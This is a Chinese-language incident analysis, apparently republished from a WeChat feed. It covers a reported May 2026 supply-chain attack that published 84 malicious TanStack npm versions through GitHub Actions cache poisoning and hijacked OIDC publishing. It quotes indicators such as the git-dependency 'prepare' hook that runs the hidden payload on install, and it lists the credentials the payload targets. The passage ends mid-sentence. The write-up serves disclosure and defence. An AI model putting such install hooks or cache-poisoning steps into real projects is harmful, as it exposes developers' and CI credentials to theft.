---
title: 前端核心生态 TanStack 被投毒：攻击者没有偷 npm 账号，却借官方 CI 发了 84 个恶意版本
url: https://mp.weixin.qq.com/s/mW8y5y218EAw_mX1nR7c9g
source: Doonsec's feed
date: 2026-05-12
fetch_date: 2026-05-13T05:45:00.351693
---

# 前端核心生态 TanStack 被投毒：攻击者没有偷 npm 账号，却借官方 CI 发了 84 个恶意版本

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XXmXKfaNf4qbjqsrdrNlCYGEZ2TvegDCUnPd11vPr9bsHFriacLWysDrv4kpXAlFCEB0XWpicuLPibUv7g2SY9OLbV89qD8g9icUPQmc8sOmzao/0?wx_fmt=jpeg)

# 前端核心生态 TanStack 被投毒：攻击者没有偷 npm 账号，却借官方 CI 发了 84 个恶意版本

原创

XueMian
XueMian

雪面科技

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 前端核心生态 TanStack 被投毒

# 攻击者没有偷 npm 账号，却借官方 CI 发了 84 个恶意版本

**摘要：** TanStack 不是一个边缘 npm 包集合。它覆盖 Query、Table、Router、Start、Virtual 等项目，长期处在 React、Vue、Solid 等前端应用的关键依赖层。2026 年 5 月 11 日，攻击者借 GitHub Actions 缓存污染和 OIDC trusted publishing，从 TanStack 官方 CI 发布了 42 个 `@tanstack/*` 包的 84 个恶意版本。这次事件的重点不只是 npm 包被投毒，而是一个前端基础设施级项目的发布链路被绕过了信任边界。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XXmXKfaNf4ok2ulBQB2Jw7wdAJhzC9DNE39PnUcBEsoicnibY1ibibbH00v7HCod3L5wrECUEN5O5Xnayw4YDhEpQdiaUk8HSDANVfsBjgd2rDL0/640?wx_fmt=png&from=appmsg)

npm 供应链攻击并不新鲜。typo-squatting、维护者账号钓鱼、`postinstall` 脚本偷 `.env`，这些打法这几年已经见过很多次。

但 2026 年 5 月 11 日的 TanStack 事件不太一样。攻击者没有长期控制 npm 账号，也没有把恶意代码合进 TanStack 主仓库源码。他们绕了一圈，把 GitHub Actions 的 PR 工作流、缓存机制和 npm OIDC trusted publishing 串到了一起。

这条链路大致是这样：先用一个看似普通的 fork PR 触发目标仓库的工作流，再污染后续 release workflow 会恢复的 pnpm 缓存；等正式发布流程运行时，恶意代码从官方 CI runner 里拿到短期 OIDC 发布身份，最后用 TanStack 的合法发布通道把恶意版本推到 npm。

麻烦就在这里。从 npm 的视角看，发布来源是可信的；从一些自动化扫描工具的视角看，包甚至可能带着 provenance。但实际执行环境已经被污染，来源可信并不等于产物可信。

本文时间均以 UTC 为准。事件核心窗口是 **2026-05-11 19:20 到 19:26 UTC**。

## 先把性质说清楚：这不是 npm 账号被盗

根据 TanStack 官方复盘，攻击者在 2026 年 5 月 11 日 19:20 至 19:26 UTC 之间，向 npm 发布了 **42 个 `@tanstack/*` 包的 84 个恶意版本**。多数包被连续发布了两个恶意版本。

受影响的主要是 TanStack Router / Start 相关包，例如：

* `@tanstack/history`
* `@tanstack/react-router`
* `@tanstack/router-core`
* `@tanstack/router-plugin`
* `@tanstack/router-vite-plugin`
* `@tanstack/react-start`
* `@tanstack/vue-router`
* `@tanstack/solid-router`
* `@tanstack/start-*`
* `@tanstack/*-adapter`

TanStack 同时确认，下面这些包家族没有受到这次投毒影响：

* `@tanstack/query*`
* `@tanstack/table*`
* `@tanstack/form*`
* `@tanstack/virtual*`
* `@tanstack/store`
* `@tanstack/start`

  这个 meta-package 本身

这里要和之前那个 unscoped `tanstack` 仿冒包区分开。那个包不在 TanStack 官方组织的 `@tanstack` scope 下，属于品牌碰瓷；这次则是官方 scope 下的真实包被发布了恶意版本，严重程度完全不同。

GitHub Security Advisory 已将该事件标为 Critical，CVE 编号为 **CVE-2026-45321**，CVSS 评分 **9.6**。

## 恶意包里改了什么

这批恶意版本留下了几个容易识别的指纹。

首先，`package.json` 里被加入了一个新的 `optionalDependencies`：

```
"optionalDependencies": {
  "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
}
```

这个 `@tanstack/setup` 不是 npm registry 上的正常包，而是一个 GitHub git dependency，指向 `tanstack/router` fork network 里的 orphan commit。

npm 安装 Git dependency 时，会执行依赖里的生命周期脚本。这个 Git dependency 的 `package.json` 里写着：

```
"scripts": {
  "prepare": "bun run tanstack_runner.js && exit 1"
}
```

也就是说，只要有人安装受影响版本：

```
npm install
pnpm install
yarn install
```

包管理器就会解析这个 optional dependency，拉取 GitHub 上的 payload commit，执行 `prepare`，然后运行恶意代码。

末尾的 `&& exit 1` 也不是随手写的。因为这是 optional dependency，即使最后失败，包管理器也可能把它当成“可选依赖安装失败”处理。恶意代码已经执行完了，安装现场却只留下一个容易被忽略的失败。

另一个指纹是 tarball 根目录里多了一个约 **2.3 MB** 的混淆文件：

```
router_init.js
```

这个文件不属于正常包内容，也没有出现在包声明的 `files` 列表中。安全厂商的分析显示，它使用了典型 JavaScript obfuscator 风格：字符串数组轮转、十六进制标识符、控制流平坦化、死代码注入。换句话说，它不是给人读的。

从公开分析看，它至少做了三类事情：

1. 在开发机或 CI runner 上搜集凭据
2. 通过 Session/Oxen 相关网络外传数据
3. 利用拿到的 npm、GitHub、OIDC 能力继续污染更多包

更准确地说，这不是单纯的 infostealer，而是带传播能力的供应链蠕虫。

## 它想拿什么

结合 TanStack 官方公告、GitHub Advisory、Socket 和 Aikido 的分析，payload 明显是冲着现代开发环境和 CI/CD 去的。目标包括：

* GitHub token、PAT、Actions 环境变量
* npm token 和发布权限
* GitHub Actions OIDC token
* AWS 环境变量、IMDS、Secrets Manager、SSM
* GCP metadata
* Kubernetes service account token
* HashiCorp Vault token 和集群内 Vault endpoint
* SSH 私钥
* 本地环境变量和常见凭据文件
* 开发工具目录，例如 `.claude/`、`.vscode/`

这不是只偷项目 `.env` 的脚本。它盯上的是发布权、云侧权限和横向移动能力。

很多 CI runner 上本来就会出现这些东西：

* npm 发布权限
* GitHub repository token
* cloud deploy key
* Kubernetes token
* Vault token
* production deploy secret

前端依赖只是入口，CI/CD 才是攻击者真正想进的地方。

## 时间线：一个 PR 怎么变成 npm 投毒

下面按公开信息整理关键节点。

### 2026-05-10：准备 fork 和恶意提交

攻击者创建了 TanStack/router 的 fork，并把 fork 改名为 `configuration`，降低它被普通 fork 搜索发现的概率。

随后攻击者在 fork 里制造恶意 commit，加入一个约 30000 行的 JS payload 文件：

```
packages/history/vite_setup.mjs
```

提交作者伪装成：

```
claude <claude@users.noreply.github.com>
```

这里的 `claude` 不是 Anthropic 的 Claude，只是攻击者伪造的提交身份。现在很多仓库里都会出现 AI coding agent 的提交，这种伪装容易混进日常噪音。

### 2026-05-11 10:49：恶意 PR 打开

攻击者打开 PR，标题类似：

```
WIP: simplify history build
```

这个 PR 触发了 TanStack/router 的部分 `pull_request_target` 工作流，例如 `bundle-size.yml` 和 `labeler.yml`。

问题从这里开始。`pull_request_target` 运行在目标仓库上下文里，本来适合做评论、打标签这类不需要执行 PR 代码的事情。一旦它 checkout 并执行 fork PR 里的代码，就进入了 GitHub Security Lab 很早就提醒过的 “Pwn Request” 场景。

### 2026-05-11 11:11：恶意代码在 PR 工作流里执行

攻击者多次 force push，把恶意 commit 放到 PR head。`bundle-size.yml` 的 benchmark job checkout 了 PR merge ref，然后运行：

```
pnpm install
pnpm nx run @benchmarks/bundle-size:build
```

这一步执行了攻击者控制的构建逻辑。

有人可能会问：如果这个 job 权限是 read-only，没有 secrets，能造成多大影响？

关键在 Actions cache。缓存保存和恢复不只受 `GITHUB_TOKEN` 权限影响，还涉及 runner runtime token 和 GitHub 的 cache 服务机制。一个看似低权限的 PR job，仍然可能污染 base repo 作用域下后续 workflow 会恢复的缓存。

### 2026-05-11 11:29：GitHub Actions 缓存被污染

恶意代码把内容写进 pnpm store，并命中了 release workflow 后面会用到的缓存 key：

```
Linux-pnpm-store-6f9233a50def742c09fde54f56553d6b449a535adf87d4083690539f49ae4da11
```

PR job 结束时，Actions cache 保存了这个被污染的 pnpm store。缓存作用域是 `refs/heads/main`，也就是未来主分支 workflow 可以恢复到。

这一步很隐蔽：PR 可以关掉，branch 可以删掉，恶意 diff 也可以消失，但缓存还在。

攻击者随后把 PR force push 回无改动状态，关闭 PR，并删除分支。表面上看，这只是一个 0-file no-op PR；实际上发布链路里已经埋下了会被恢复的恶意内容。

### 2026-05-11 19:15：正常 PR 合并，release workflow 触发

TanStack 维护者合并了一个正常 PR，主分支 push 触发 `release.yml`。

release workflow 恢复了之前被污染的 pnpm store。恶意代码从“不可信 PR 工作流”横向移动到了“正式发布工作流”。

这也是 GitHub Actions cache poisoning 最危险的点：它让攻击者跨过了原本应该隔离的工作流边界。

### 2026-05-11 19:20：第一批恶意版本发布

npm registry 开始收到 `@tanstack/history@1.161.9` 等包的发布请求。

这些请求通过了 TanStack/router 的 GitHub Actions OIDC trusted-publisher 绑定认证，但不是来自 workflow 文件里原本定义的发布步骤。TanStack 官方复盘提到，真正的发布发生在测试/清理阶段运行的恶意代码里。

恶意代码利用 workflow 的：

```
permissions:
  id-token: write
```

从 GitHub Actions runner 进程内存中提取 OIDC token，然后直接向 npm registry 发 POST 请求完成发布。

换句话说：

* npm 长期 token 没有被偷
* npm maintainer 账号没有直接失陷
* release workflow 文件本身没有被攻击者改掉
* 攻击者仍然用官方 CI 身份发布了恶意 npm 包

这是这次事件最值得关注的地方。

### 2026-05-11 19:26：第二批恶意版本发布

第二个主分支 push 触发了另一个 release workflow，同样恢复了被污染缓存，发布第二批恶意版本。最终影响面扩大到 42 个包、84 个版本。

### 2026-05-11 19:50 之后：外部研究员发现并报告

外部研究员很快在 GitHub issue 中公开报告异常，Socket、StepSecurity 等安全团队也参与确认。TanStack 维护者随后开始响应：

* 废弃受影响 npm 版本
* 联系 npm security 拉取恶意 tarball
* 清理 GitHub Actions cache
* 收回或限制团队 push 权限
* 重构问题 workflow
* 增加 repository owner guard
* 固定第三方 action 引用到 SHA
* 发布 GitHub Security Advisory

![](https://mmbiz.qpic.cn/mmbiz_png/XXmXKfaNf4oS5hzJBRTWvZSlYUdB6YaTwlahgTwRTGPdStp8OeCRY0P95N6ABonyfgJInwZhGVIjynSqENRRbyph6sGibVIgWDt60HkA4wwc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/XXmXKfaNf4ryoTc8EpepxAddpDgXRLNMvMx88T5bg47u0Fl4HiauHmG2DIyplZhZ20LWibl55xKI4nLI65X11DbSiaoHicr1LKctamtYQ3rP04o/640?wx_fmt=png&from=appmsg)

    从公开时间线看，社区发现和项目响应都很快。但恶意版本在窗口期内已经可被安装。只要某台开发机或 CI runner 执行过受影响版本的 install，就应该按凭据暴露处理。同时。。。这也是我看过最多involved package的advisory 🤔

## 根因：三个机制单独看都常见，串起来就出事

这不是一个单点漏洞，而是几个信任假设叠在一起后崩了。

### 1. `pull_request_target` 执行了不可信 PR 代码

`pull_request_target` 的特殊之处在于，它运行在目标仓库上下文里，可以拥有比普通 fork PR 更高的权限。

它适合做：

* 给 PR 打标签
* 评论 PR
* 根据 metadata 做轻量处理

它不适合做：

* checkout fork PR 代码
* `npm install`
* `pnpm install`
* 执行 build/test
* 运行任何来自 PR 的脚本

原因很简单：PR 作者可以控制 `package.json`、构建脚本、测试文件和依赖声明。只要 workflow 执行这些内容，就等于允许 PR 作者在 runner 上运行代码。

GitHub Security Lab 早在 2021 年就专门写过 “Preventing pwn requests”，核心建议就是不要在 `pull_request_target` 里 checkout 并执行不可信 PR 内容。

### 2. GitHub Actions cache 跨越了信任边界

Actions cache 的设计目标是加速构建，不是做安全隔离。

在这次事件里，攻击者利用 PR job 写入缓存，正式 release workflow 后续恢复同一个缓存。缓存成了两个信任域之间的暗道。

Adnan Khan 在 2024 年关于 GitHub Actions cache poisoning 的研究里就指出过类似风险：如果不可信上下文能写缓存，而高权限 workflow 后续会恢复缓存，攻击者就有机会通过缓存横向移动。

TanStack 这次事件就是一个现实案例。

### 3. OIDC trusted publishing 被运行时劫持

OIDC trusted publishing 的价值很明确：减少长期 npm token 暴露。它通常比把 `NPM...